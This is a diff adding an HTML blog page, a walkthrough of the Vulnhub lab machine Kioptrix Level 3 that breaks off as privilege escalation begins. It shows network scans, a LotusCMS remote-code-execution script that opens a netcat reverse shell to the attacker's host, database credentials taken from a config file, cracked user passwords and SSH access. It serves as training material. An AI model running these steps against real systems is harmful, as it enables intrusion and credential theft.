@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kioptrix Level 3 Walkthrough - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/en/kioptrix_level_3/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Kioptrix Level 3 Walkthrough">
+  <meta property="og:description" content="Kioptrix Level 3 Machine Resolution Scanning and Vulnerability Analysis We start with a scan of our local network with the arp command to obtain the ip of our target machine.
+arp-scan -I eth0 --localnet Once the ip is obtained we proceed to perform a scan with nmap.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-08-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-08-25T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Vulnhub">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Easy">
+    <meta property="og:image" content="http://localhost:1313/es/kioptrix_level_3/preimagenKioptrix3.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/es/kioptrix_level_3/preimagenKioptrix3.png">
+  <meta name="twitter:title" content="Kioptrix Level 3 Walkthrough">
+  <meta name="twitter:description" content="Kioptrix Level 3 Machine Resolution Scanning and Vulnerability Analysis We start with a scan of our local network with the arp command to obtain the ip of our target machine.
+arp-scan -I eth0 --localnet Once the ip is obtained we proceed to perform a scan with nmap.">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/en/kioptrix_level_3/" /><link rel="prev" href="http://localhost:1313/en/kioptrix_level_2/" /><link rel="next" href="http://localhost:1313/en/kioptrix_level_5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kioptrix Level 3 Walkthrough",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/en\/kioptrix_level_3\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/es\/kioptrix_level_3\/preimagenKioptrix3.png",
+                            "width":  708 ,
+                            "height":  338 
+                        }],"genre": "posts","keywords": "Walkthrough, Vulnhub, TjNull, OSCP, Easy","wordcount":  627 ,
+        "url": "http:\/\/localhost:1313\/en\/kioptrix_level_3\/","datePublished": "2023-08-25T00:00:00+00:00","dateModified": "2023-08-25T11:24:09+02:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/en/" title="AntuSec">AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/en/posts/"> Posts </a><a class="menu-item" href="/en/tags/"> Tags </a><a class="menu-item" href="/en/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/es/kioptrix_level_3/">Español</option><option value="/en/kioptrix_level_3/" selected>English</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/en/" title="AntuSec">AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/en/posts/" title="">Posts</a><a class="menu-item" href="/en/tags/" title="">Tags</a><a class="menu-item" href="/en/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/es/kioptrix_level_3/">Español</option><option value="/en/kioptrix_level_3/" selected>English</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kioptrix Level 3 Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/en/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">included in <a href="/en/categories/vulnhub/"><i class="far fa-folder" aria-hidden="true"></i>Vulnhub</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-25">2023-08-25</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;627 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/preimagenKioptrix3.png"
+        data-srcset="/es/kioptrix_level_3/preimagenKioptrix3.png, /es/kioptrix_level_3/preimagenKioptrix3.png 1.5x, /es/kioptrix_level_3/preimagenKioptrix3.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/preimagenKioptrix3.png"
+        title="/es/kioptrix_level_3/preimagenKioptrix3.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#machine-resolution">Machine Resolution</a>
+      <ul>
+        <li><a href="#scanning-and-vulnerability-analysis">Scanning and Vulnerability Analysis</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kioptrix-level-3">Kioptrix Level 3</h1>
+<h2 id="machine-resolution">Machine Resolution</h2>
+<h3 id="scanning-and-vulnerability-analysis">Scanning and Vulnerability Analysis</h3>
+<p>We start with a scan of our local network with the arp command to obtain the ip of our target machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan -I eth0 --localnet</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png"
+        title="Untitled" width="732" height="188" /></p>
+<p>Once the ip is obtained we proceed to perform a scan with nmap.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV 192.168.66.161</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-25 13:37 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> kioptrix3.com <span class="o">(</span>192.168.66.161<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0099s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 <span class="o">(</span>DSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">2048</span> 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.2.8 <span class="o">((</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.2.8 <span class="o">(</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Ligoat Security - Got Goat? Security ...
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 7.34 seconds</span></span></code></pre></div></div>
+<p>After scanning with nmap we see that port 80 is open with an http service so let&rsquo;s see what it contains using our browser in this case Firefox and we see the following website.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png"
+        title="Untitled" width="1232" height="578" /></p>
+<p>In the description of the machine tells us to add the domain <a href="http://kioptrix3.com" target="_blank" rel="noopener noreffer ">kioptrix3.com</a> to our file /etc/hosts to be able to see the web so we open it and add the following:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">192.168.66.161  kioptrix3.com</span></span></code></pre></div></div>
+<h3 id="exploitation">Exploitation</h3>
+<p>After surfing the site we can see that the web is made with LotusCMS.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png"
+        title="Untitled" width="790" height="425" /></p>
+<p>So we went to Google to find out if there is any exploit for this CMS and we found the following:</p>
+<p><a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit" target="_blank" rel="noopener noreffer ">https://github.com/Hood3dRob1n/LotusCMS-Exploit</a></p>
+<p>we clone it to our machine and run</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./lotusRCE.sh kioptrix3.com /
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Enter our ip</span>
+</span></span><span class="line"><span class="cl">192.168.66.152 
+</span></span><span class="line"><span class="cl"><span class="c1">#Port</span>
+</span></span><span class="line"><span class="cl"><span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#In another terminal start netcat</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#select option 1</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#we have a  shell</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.66.152<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.66.161<span class="o">]</span> <span class="m">38651</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data</span></span></code></pre></div></div>
+<p>We performed a tty treatment to work more comfortably and to be able to do Ctrl+C.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">stty raw –echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">stty rows &lt;num&gt; columns &lt;cols&gt;</span></span></code></pre></div></div>
+<p>After enumerating for a while we found the file gconfig.php in /home/www/kioptrix3.com/gallery which contains some credentials to the database.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png"
+        title="Untitled" width="540" height="139" /></p>
+<p>we log into mysql:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -uroot -pfuckeyou</span></span></code></pre></div></div>
+<p>And we obtain the credentials of the admin user but after a few attempts it does not help us to change the user.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png"
+        title="Untitled" width="1118" height="652" /></p>
+<p>We log into phpmyadmin with the credentials obtained previously.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png"
+        title="Untitled" width="1066" height="524" /></p>
+<p>and locate the hashes of the machine&rsquo;s users
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png"
+        title="Untitled" width="1107" height="515" /></p>
+<p>I have used an online website to crack these hashes by obtaining the password in clear text.</p>
+<p><a href="https://crackstation.net/" target="_blank" rel="noopener noreffer ">https://crackstation.net/</a></p>
+<p>Dreg</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png"
+        title="Untitled" width="1051" height="343" /></p>
+<p>loneferret</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png"
+        title="Untitled" width="1014" height="354" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dreg:Mast3r
+</span></span><span class="line"><span class="cl">loneferret:starwars</span></span></code></pre></div></div>
+<p>Once we have obtained the credentials we connect via SSH but we get an error.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png"
+        title="Untitled" width="889" height="69" /></p>
+<p>To solve it we write the following to connect:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh  -oHostKeyAlgorithms<span class="o">=</span>+ssh-dss loneferret@192.168.66.161</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png"
+        title="Untitled" width="591" height="303" /></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>If we read the CompanyPolicy.README file it tells us that they have installed new software to edit, create and view files and to use the command &ldquo;sudo ht&rdquo;.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png"
